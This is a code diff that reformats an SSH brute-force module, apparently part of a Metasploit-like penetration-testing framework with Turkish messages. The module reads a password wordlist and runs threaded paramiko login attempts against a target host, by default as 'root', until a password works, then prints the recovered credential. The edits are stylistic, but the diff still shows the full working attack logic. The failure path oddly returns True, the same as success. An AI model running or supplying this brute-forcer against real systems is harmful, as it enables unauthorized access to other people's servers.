@@ -1,18 +1,24 @@
-import paramiko
 import concurrent.futures
+import os
 import threading
-from typing import Dict, Any
+from typing import Any
+
+import paramiko
+from rich import print
+
 from core.module import BaseModule
 from core.option import Option
-from rich import print
-import os
+
 
 class ssh_brute(BaseModule):
     """
     Hedef sistemde SSH servisi için bruteforce (şifre deneme) modülü.
     """
+
     Name = "SSH Brute Forcer"
-    Description = "Verilen kullanıcı adı ve parola listesi (Wordlist) ile SSH'a girmeyi dener."
+    Description = (
+        "Verilen kullanıcı adı ve parola listesi (Wordlist) ile SSH'a girmeyi dener."
+    )
     Author = "Mahmut P."
     Category = "auxiliary/scanner"
     Version = "1.0"
@@ -25,13 +31,18 @@ class ssh_brute(BaseModule):
             "RHOST": Option("RHOST", "127.0.0.1", True, "Hedef IP adresi"),
             "RPORT": Option("RPORT", 22, True, "Hedef Port"),
             "USERNAME": Option("USERNAME", "root", True, "Denenecek kullanıcı adı"),
-            "WORDLIST": Option("WORDLIST", "config/wordlists/passwords/common.txt", True, "Şifre listesi dosyası"),
+            "WORDLIST": Option(
+                "WORDLIST",
+                "config/wordlists/passwords/common.txt",
+                True,
+                "Şifre listesi dosyası",
+            ),
             "THREADS": Option("THREADS", 5, True, "Eşzamanlı bağlantı sayısı"),
             "TIMEOUT": Option("TIMEOUT", 5, False, "Bağlantı zaman aşımı (saniye)"),
         }
         for option_name, option_obj in self.Options.items():
             setattr(self, option_name, option_obj.value)
-        
+
         # Sadece auth loglarını bastırmak için
         log_dir = os.path.join(os.getcwd(), "config", "logs")
         if not os.path.exists(log_dir):
@@ -47,9 +58,16 @@ class ssh_brute(BaseModule):
 
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        
+
         try:
-            client.connect(hostname=target, port=port, username=username, password=password, timeout=timeout, auth_timeout=timeout)
+            client.connect(
+                hostname=target,
+                port=port,
+                username=username,
+                password=password,
+                timeout=timeout,
+                auth_timeout=timeout,
+            )
             client.close()
             self.stop_event.set()  # Başarılı olursa diğer thread'leri durdur
             return password
@@ -59,8 +77,8 @@ class ssh_brute(BaseModule):
             return None
         finally:
             client.close()
-            
-    def run(self, options: Dict[str, Any]):
+
+    def run(self, options: dict[str, Any]):
         rhost = options.get("RHOST")
         rport = int(options.get("RPORT", 22))
         username = options.get("USERNAME")
@@ -80,7 +98,7 @@ class ssh_brute(BaseModule):
         print(f"[bold cyan][*] Wordlist: {wordlist_path}[/bold cyan]")
 
         try:
-            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
+            with open(wordlist_path, encoding="utf-8", errors="ignore") as f:
                 passwords = [line.strip() for line in f if line.strip()]
         except Exception as e:
             print(f"[bold red][-] Dosya okunamadı: {e}[/bold red]")
@@ -90,16 +108,20 @@ class ssh_brute(BaseModule):
             print(f"[bold yellow][!] {wordlist_path} dosyası boş.[/bold yellow]")
             return False
 
-        print(f"[bold cyan][*] Toplam {len(passwords)} parola denenecek. (Thread: {threads})[/bold cyan]\n")
+        print(
+            f"[bold cyan][*] Toplam {len(passwords)} parola denenecek. (Thread: {threads})[/bold cyan]\n"
+        )
 
         with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
             future_to_password = {
-                executor.submit(self.attempt_login, rhost, rport, username, pw, timeout): pw 
+                executor.submit(
+                    self.attempt_login, rhost, rport, username, pw, timeout
+                ): pw
                 for pw in passwords
             }
-            
+
             for future in concurrent.futures.as_completed(future_to_password):
-                pw = future_to_password[future]
+                future_to_password[future]
                 try:
                     result = future.result()
                     if result:
@@ -109,10 +131,12 @@ class ssh_brute(BaseModule):
                     pass
 
         if self.success_password:
-            print(f"\n[bold green][+] BAŞARILI: Giriş sağlandı.[/bold green]")
+            print("\n[bold green][+] BAŞARILI: Giriş sağlandı.[/bold green]")
             print(f"[bold green][+] Kullanıcı Adı:[/bold green] {username}")
             print(f"[bold green][+] Parola:[/bold green] {self.success_password}")
             return True
         else:
-            print(f"\n[bold red][-] BAŞARISIZ: Verilen şifrelere listedeki {len(passwords)} şifre arasında eşleşme bulunamadı.[/bold red]")
+            print(
+                f"\n[bold red][-] BAŞARISIZ: Verilen şifrelere listedeki {len(passwords)} şifre arasında eşleşme bulunamadı.[/bold red]"
+            )
             return True
